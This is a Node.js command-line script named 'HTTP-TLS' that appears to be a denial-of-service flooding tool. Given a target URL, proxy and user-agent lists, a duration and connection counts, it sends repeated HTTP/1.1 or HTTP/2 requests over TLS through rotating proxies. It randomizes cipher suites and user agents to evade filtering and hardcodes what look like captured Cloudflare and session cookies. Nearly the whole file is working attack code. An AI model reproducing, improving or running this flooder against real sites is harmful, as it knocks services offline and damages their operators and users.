// npm i fs events randomstring url path cluster http2 http tls cloudscraper net 

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

// Error log
// process.on('uncaughtException', function(er) {
//     console.log(er);
// });
// process.on('unhandledRejection', function(er) {
//     console.log(er);
// });

(ignoreNames = [
    "RequestError",
    "StatusCodeError",
    "CaptchaError",
    "CloudflareError",
    "ParseError",
    "ParserError",
]),
(ignoreCodes = [
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
    "ERR_HTTP2_ERROR",
    "ERR_SSL_WRONG_VERSION_NUMBER",
    "HPE_INVALID_CONSTANT",
    "ERR_SSL_DECRYPTION_FAILED_OR_BAD_RECORD_MAC",
    "ENETUNREACH",
    "ERR_HTTP2_STREAM_CANCEL",
    "ERR_HTTP2_INVALID_SESSION",
]);

process.on("uncaughtException", function (e) {
if((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name)))
    return false;
    console.warn(e);
}).on("unhandledRejection", function (e) {
if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name)))
    return false;
    console.warn(e);
}).on("warning", (e) => {
if((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name)))
    return false;
    console.warn(e);
}).on("SIGHUP", () => {
    return 1;
}).on("SIGCHILD", () => {
    return 1;
});

var CustomsARGVS = require("minimist")(process.argv.slice(2));
const fs = require('fs');
const url = require('url');
var crypto = require("crypto");

var path = require("path");
const http2 = require('http2');
const tls = require('tls');
const http = require('http');

var fileName = __filename;
var file = path.basename(fileName);

let headerbuilders;

if (!CustomsARGVS.method || !CustomsARGVS.target || !CustomsARGVS.time || !CustomsARGVS.proxy || !CustomsARGVS.ua || !CustomsARGVS.connections || !CustomsARGVS.threads){
    console.log('HTTP-TLS');
    console.log('node http-tls --method GET --target "" --proxy proxy.txt --ua user-agents.txt --time 60 --connections 30 --threads 1 --postdata "" --cookies "" --referer "" --httpversion HTTP1');
    process.exit(0);
}

var Method = CustomsARGVS.method;
var AttackTime = CustomsARGVS.time;
var Target = CustomsARGVS.target.split('""')[0];
var proxies = fs.readFileSync(CustomsARGVS.proxy, 'utf-8').toString().replace(/\r/g, '').split('\n');
var UAs = fs.readFileSync(CustomsARGVS.ua, 'utf-8').toString().replace(/\r/g, '').split('\n');
var Connections = CustomsARGVS.connections;
var threads = CustomsARGVS.threads;
let delay = CustomsARGVS.delay;

if(CustomsARGVS.httpversion == "HTTP1") {
    if(CustomsARGVS.postdata) {
        if (Method.toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        var PostData = CustomsARGVS.postdata.split('""')[0];
    } else {
        var PostData = "";
    }

    if(CustomsARGVS.cookies) {
        var Cookie = CustomsARGVS.cookies.split('""')[0];
        try {
            const customcookies = Cookie.split(";");
            for (let i = 0; i < customcookies.length; i++) {
                Cookies += `${customcookies};`
            }
        } catch {
            Cookies += Cookie;
        }
    } else {
        var Cookies = '';
    }

    if(CustomsARGVS.referer) {
        var Referer = CustomsARGVS.referer.split('""')[0];
        // console.log(Referer)
    } else {
        var Referer = '';
    }

	setTimeout(() => {
		process.exit(1);
	}, AttackTime * 1000);

	setTimeout( () => {
		startflood();
	}, delay * 1000);

    var parsed = url.parse(Target);

    const cplist = [
        "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
    ];

    async function startflood(){
        if (Method.toUpperCase() == "POST"){
            setInterval(() => {
                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
                var ua = UAs[Math.floor(Math.random() * UAs.length)];

                var http = require('http'),
                    tls = require('tls');

                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) { 
                    //open raw request
                    var tlsConnection = tls.connect({
                        host: parsed.host,
                        ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                        secureProtocol: 'TLSv1_2_method',
                        servername: parsed.host,
                        secure: true,
                        rejectUnauthorized: false,
                        socket: socket
                    }, async function () {
                        for (let j = 0; j < Connections; j++) {
                            // setInterval( async () => {
                            tlsConnection.write("GET" + ' ' + `${parsed.path}` + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nConnection: Keep-Alive\r\nHost: ' + parsed.host + '\r\nReferer: '+ Referer + '\r\nCookie: '+ Cookies + '\r\nuser-agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n');
                            // }, 1*1000);
                        }
                    });
                    tlsConnection.on('error', function(data) {
                        tlsConnection.end();
                        tlsConnection.destroy();
                    });
            
                    tlsConnection.on('data', function (data) {
                        return;
                    });
                });
                req.end();
            });
        } else if (Method.toUpperCase() == "GET") {
            setInterval(() => {
                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
                var ua = UAs[Math.floor(Math.random() * UAs.length)];

                var http = require('http'),
                    tls = require('tls');

                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) { 
                    //open raw request
                    var tlsConnection = tls.connect({
                        host: parsed.host,
                        ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                        secureProtocol: 'TLSv1_2_method',
                        servername: parsed.host,
                        secure: true,
                        rejectUnauthorized: false,
                        socket: socket
                    }, async function () {
                        for (let j = 0; j < Connections; j++) {
                            // setInterval( async () => {
                            tlsConnection.write("GET" + ' ' + `${parsed.path}` + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nConnection: Keep-Alive\r\nHost: ' + parsed.host + '\r\nReferer: '+ Referer + '\r\nCookie: '+ Cookies + '\r\nuser-agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n');
                            // }, 1*1000);
                        }
                    });
                    tlsConnection.on('error', function(data) {
                        tlsConnection.end();
                        tlsConnection.destroy();
                    });
            
                    tlsConnection.on('data', function (data) {
                        return;
                    });
                });
                req.end();
            });
        }
    }
} else if(CustomsARGVS.httpversion == "HTTP2") {
    const cplist = [
        "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
    ];

    if(CustomsARGVS.postdata) {
        if (Method.toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        var PostData = CustomsARGVS.postdata.split('""')[0];
    } else {
        var PostData = "";
    }

    if(CustomsARGVS.cookies) {
        var cookies = CustomsARGVS.cookies.split('""')[0];
    } else {
        var cookies = "";
    }

    if(CustomsARGVS.referer) {
        var rff = CustomsARGVS.referer.split('""')[0];
    } else {
        var rff = Target;
    }

	setTimeout(() => {
		process.exit(1);
	}, AttackTime * 1000);

	setTimeout( () => {
		startflood();
	}, delay * 1000);

    var parsed = url.parse(Target);

    const sigalgs = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512',
    ];
    
    let SignalsList = sigalgs.join(':');

    function startflood(){
        if (Method.toUpperCase() == "POST"){
            headerbuilders = {}
            headerbuilders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
            headerbuilders["accept-language"] = "en-US,en;q=0.9"
            headerbuilders["cache-control"] = "max-age=0"
            headerbuilders["referer"] = rff
            headerbuilders["cookie"] = cookies
            headerbuilders["sec-fetch-dest"] = "document"
            headerbuilders["sec-fetch-mode"] = "navigate"
            headerbuilders["sec-fetch-site"] = "none"
            headerbuilders["sec-fetch-user"] = "?1"
            headerbuilders["sec-gpc"] = "1"
            headerbuilders["upgrade-insecure-requests"] = "1"
            headerbuilders[":method"] = "POST"
            headerbuilders["Content-Type"] = "text/plain"
            headerbuilders["user-agent"] = UAs[Math.floor(Math.random() * UAs.length)];

            setInterval(() => {
                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.2';

                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: "TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256"+":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) { 
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            socket: socket
                        }, async function () {
                            for (let i = 0; i< Connections; i++) {
                                headerbuilders[":path"] = `${url.parse(Target).path}`
                                headerbuilders["Body"] = `${PostData ? PostData : "rand=rand"}`
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", () => {
                                    req.close();
                                })
                            }
                        })
                    });
                }).end();
            });
        } else if (Method.toUpperCase() == "GET") {
            headerbuilders = {}
            headerbuilders[":authority"] = parsed.host
            headerbuilders[":method"] = Method
            headerbuilders[":path"] = `${url.parse(Target).path}`
            headerbuilders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
            headerbuilders["accept-language"] = "en-US,en;q=0.9"
            headerbuilders["cache-control"] = "max-age=0"
            headerbuilders["referer"] = rff
            headerbuilders["cookie"] = "XSRF-TOKEN: eyJpdiI6ImF0SHVSQ2xRQVFVRURCY2dGek9uOGc9PSIsInZhbHVlIjoiR3dHRlV1bWVjakJocGpuR3d3dTdrazhMN045WmxVK1ZDbHZVbkgzRjhCL3liRktRVldMZ1YwV2RDTU9EbVB6TTAxSHg5TXhkWU9rYlFlR2pnK1pnWWppYVZ3dzdhTmYzQTNDTEVzQ2cxbW1VQzd5dVVKWnpKb21FZG1XcUFLTVoiLCJtYWMiOiJiZjhiNGVmNDhkNzkzNjZkZTgxYjJjMjk0ZGU0ODU3MTRmOWI4MzQzNjllY2RiMTNmNzU4MTcxZDhiZjFjZmY4IiwidGFnIjoiIn0%3D;__cf_bm: 79YoKJv_6GeYsZhoFm7PPiDMf68OWycweSNnSPYtZsc-1657479534-0-AVabTtw4cEAkSG7ivXoBdLeSJSaDGUgcJUIbLwGZI1ZAiIjAwURuEU2fKvrSYYmGs9oWyfLPd/ZIrvUdmahfmLgCHWITilTUxR+7QkBfjYiojs8u+DfBxctDDg9MBKQl6w==; dcap: D399F15105B620939F62E77076266A357A91C15F593B8C9A6DABAFB71739C677D01B554AFCCA943DAC2BD8BC2FD907584ACF353A009E4A126BB38C1A4D0F4F3F5D0AAE485ADF58121F4B6AEBB0B20144; laravel_ssn: eyJpdiI6IkJqZ0ZyUzVSellUSmhFY2Q5VGpaN0E9PSIsInZhbHVlIjoia2IycXNURW91ZU5UY1lTM05GblZVT1VTZHFBSU5iRUVlUUxBWXV1bFJtOVgrSk5Hc1JkSFc4M21yWGVNRlY1OG8xc3lSa2tqeHdiWnpXZ0txZmo5NURnbFNBRzhYbjhPTncyWUpjcE5lcVF0TWtrRk1KUkNRempSNWhIMEZ2dUIiLCJtYWMiOiI2MTM3ZWU1ZWM0NjU1Yzk1MzdlOTM0YTIzY2Y3NDhmNDVkN2I1NTkyNTFiYWVmMGZlMDViNmRmNTYxNzNhOTBmIiwidGFnIjoiIn0%3D;"
            headerbuilders["sec-fetch-dest"] = "document"
            headerbuilders["sec-fetch-mode"] = "navigate"
            headerbuilders["sec-fetch-site"] = "none"
            headerbuilders["sec-fetch-user"] = "?1"
            headerbuilders["sec-gpc"] = "1"
            headerbuilders["upgrade-insecure-requests"] = "1"
            headerbuilders["user-agent"] = UAs[Math.floor(Math.random() * UAs.length)];

            setInterval(() => {
                // var cipper = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.2';

                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    // ciphers: "TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256"+":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) { 
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            socket: socket,
                            ciphers: "TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256"+":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:"+'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                            host: parsed.host,
                            servername: parsed.host,
                            secure: true,
                            echdCurve: "GREASE:X25519:x25519",
                            honorCipherOrder: true,
                            requestCert: true,
                            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL|crypto.constants.SSLcom,
                            sigalgs: SignalsList,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                        }, async function () {
                            for (let i = 0; i< Connections; i++) {
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", () => {
                                    req.close();
                                })
                            }
                        })
                    });
                }).end();
            });
        } else {
            console.log("Invalid Method");
            process.exit(1);
        }

    }
} else {
    console.log("Invalid HTTP Version");
    process.exit(1);
}